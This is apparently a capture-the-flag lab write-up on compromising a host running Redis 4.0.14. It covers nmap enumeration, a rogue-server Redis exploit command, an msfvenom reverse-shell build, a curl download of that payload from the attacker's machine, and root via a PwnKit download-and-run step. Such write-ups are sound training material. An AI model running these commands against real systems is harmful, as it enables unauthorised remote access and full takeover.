#Pwned #KernelExploit #Redis
```IP
192.168.189.176
```
# Enumeration
## Nmap

As always I start enumerating target ports with nmap:
```Bash
sudo nmap -sCV 192.168.189.176 -vvv -p- -oN enum/full
```
The output being:
```
PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 61 OpenSSH 8.3p1 Ubuntu 1ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 37:21:14:3e:23:e5:13:40:20:05:f9:79:e0:82:0b:09 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDErzUX3Jeg2oRWhqelAA3/QrsFYoyDVaXbJK0ghZTX1i3mZY8SXopUZC09JD/6S+Ye+nFW2/6rnXHltIVWEALmPDrlDOV5m+LGujzXqc5YJcylNnwSjz9TjCHlPa+PrMdyp2NyT+Wt2w6jhVWA1sowq8R4ZDkqvpQwz9rUOVk5IRiV6fgdEuHBBXKQZu9S00iPNC5hhfmclk5k2dPtFqQRlosZfjDjv5E8Zo8YwLGonmWciNQQB8DWX47R08noPMseQMYR707ABcIgx4+DKMZ7/HlOzqwoqFdyvMSdPf5lz+cPG/aI0N6qua80uxbXg0rvMNQuZd73d5jA+Yp3eIkI4lHQqjXO4B0Gbl4lpcHTWCdUI93dLbBy13J0NdTG+vqkXszDBXr19rWaD+yeXg8FQt5ViHr7N/Pr77zFjOiAq4AjRNt6j8e+kX0Cqwov1RwUc4R1JPfmEIZqm8Ds/z+jDhkhLoJP4yjE8xNHhOz8lUk+bZh3zGuS3+97Mrkh3Rs=
|   256 b9:8d:bd:90:55:7c:84:cc:a0:7f:a8:b4:d3:55:06:a7 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBPed4/WiZ+RjcALVwQnLf74Byu1yb40zjCfDT+DBa4jiTzciU5Ql1fhEzanZGgt5VuK0y5ZAgG7f54yL9iVcaU8=
|   256 07:07:29:7a:4c:7c:f2:b0:1f:3c:3f:2b:a1:56:9e:0a (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJLFhMCuSltbhF2Mj0Xz0A3ZSEhcu8LOF9hX8bqGirVH
6379/tcp open  redis   syn-ack ttl 61 Redis key-value store 4.0.14
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
## REDIS
As shown in the nmap scan, we have a vulnerable redis version. It has the following well-known exploit in github https://github.com/n0b0dyCN/redis-rogue-server . We can exploit it with the following command:
```
python3.11 redis-rogue-server.py --rhost 192.168.222.176 --lhost 192.168.45.193 --exp=exp.so
```
In our local machine we can create a more estable shell than the one provided in the exploit:

```
msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.45.193 LPORT=4444 -a x64 -f elf -o shell
```
Using the exploit shell we will download our newly created reverse shell:
```
curl http://192.168.45.193:8000/shell -o shell
```

And execute it:

![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241116132103.png?raw=true)

Now we are logged in as prudence user, and we have access to the local flag.
# PrivEsc

## Manual
In our user's directory we find a interesting notes.txt file:

![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241116132530.png?raw=true)

But it does not seem to lead to any PE vector.
## Automated

### Peass
When executing LinPeass it prompts various kernel exploits as probable PE vectors, the most recommended being PwnKit. In the oficial PwnKit github page we find the following one line command which downloads and executes the exploit.

![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241117111500.png?raw=true)

After copying and executing the command we get root access easily.

